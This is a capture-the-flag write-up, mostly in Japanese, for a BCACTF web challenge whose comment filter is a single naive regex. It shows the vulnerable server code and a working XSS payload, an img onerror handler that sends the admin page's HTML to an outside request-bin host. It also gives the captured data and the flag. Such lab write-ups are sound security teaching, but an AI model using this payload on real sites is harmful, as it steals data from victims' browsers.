# Regular Website:webex:200pts
They said you couldn't [parse HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454). So that's exactly what I did!  
[package.json](package.json)  
[server.ts](server.ts)  
[http://webp.bcactf.com:49155/](http://webp.bcactf.com:49155/)  
  
Hint 1 of 1  
How is the site sanitizing your input?  

# Solution
サイトにアクセスするとサイトが周期的にぼやける仕組みだった。  
Just a Regular Website  
[site1.png](site/site1.png)  
[site2.png](site/site2.png)  
コメントを投稿でき、adminがそれを見るようだ。  
配布されたソースを読んでみるとserver.tsの以下が気になった。  
```ts
~~~
    const sanitized = text.replace(/<[\s\S]*>/g, "XSS DETECTED!!!!!!");
    const page = await (await browser).newPage();
    await page.setJavaScriptEnabled(true);
    try {
        await page.setContent(`
        <!DOCTYPE html>
        <html>
            <head>
                <meta charset="utf-8">
                <title>Comment</title>
            </head>
            <body>
                <p>Welcome to the Regular Website admin panel.</p>
                <h2>Site Stats</h2>
                <p><strong>Comments:</strong> ???</p>
                <p><strong>Flag:</strong> ${flag}</p>
                <h2>Latest Comment</h2>
                ${sanitized}
            </body>
        </html>
        `, {timeout: 3000, waitUntil: "networkidle2"});
    } catch (e) {
~~~
```
XSSを正規表現でサニタイズしているが、`<img src="1" onerror="alert(1)" `など不完全なタグが通ってしまう。  
flagはadmin panelに表示されるので、以下のように外のサーバでdocument.body.innerHTMLを待ち受ければよい。  
```html
<img src="1" onerror="location.href='https://[RequestBin.com]/?s='+btoa(document.body.innerHTML)" 
```
すると以下のクエリを取得できる。  
```
?s=CiAgICAgICAgICAgICAgICA8cD5XZWxjb21lIHRvIHRoZSBSZWd1bGFyIFdlYnNpdGUgYWRtaW4gcGFuZWwuPC9wPgogICAgICAgICAgICAgICAgPGgyPlNpdGUgU3RhdHM8L2gyPgogICAgICAgICAgICAgICAgPHA+PHN0cm9uZz5Db21tZW50czo8L3N0cm9uZz4gPz8/PC9wPgogICAgICAgICAgICAgICAgPHA+PHN0cm9uZz5GbGFnOjwvc3Ryb25nPiBiY2FjdGZ7aDNfYzBtZXNfVXI3NGhzaFJ9PC9wPgogICAgICAgICAgICAgICAgPGgyPkxhdGVzdCBDb21tZW50PC9oMj4KICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIxIiBvbmVycm9yPSJsb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOWJmb2dld2Q3anMueC5waXBlZHJlYW0ubmV0Lz9zPScrYnRvYShkb2N1bWVudC5ib2R5LmlubmVySFRNTCkiIDw9IiIgYm9keT0iIj4KICAgICAgICAKICAgICAgICA=
```
中身をbase64でデコードすると以下になる。  
```html
                <p>Welcome to the Regular Website admin panel.</p>
                <h2>Site Stats</h2>
                <p><strong>Comments:</strong> ???</p>
                <p><strong>Flag:</strong> bcactf{h3_c0mes_Ur74hshR}</p>
                <h2>Latest Comment</h2>
                <img src="1" onerror="location.href='https://en9bfogewd7js.x.pipedream.net/?s='+btoa(document.body.innerHTML)" <="" body="">
        
        
```
flagが得られた。  

## bcactf{h3_c0mes_Ur74hshR}